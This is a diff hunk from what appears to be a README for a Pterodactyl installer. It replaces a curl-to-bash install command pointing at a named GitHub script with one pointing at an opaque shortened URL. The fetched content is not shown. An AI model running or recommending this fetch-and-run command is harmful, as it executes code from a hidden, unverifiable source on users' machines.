@@ -49,4 +49,4 @@ Follow these simple steps to get Pterodactyl up and running:
    Copy and paste the following command into your terminal:
 
    ```bash
-   bash <(curl -sSL https://raw.githubusercontent.com/aislxflames/pterodactyl-installer/refs/heads/main/Flamedactyl-Installer.sh)
+   bash <(curl -sSL https://shorturl.at/cjeu1)
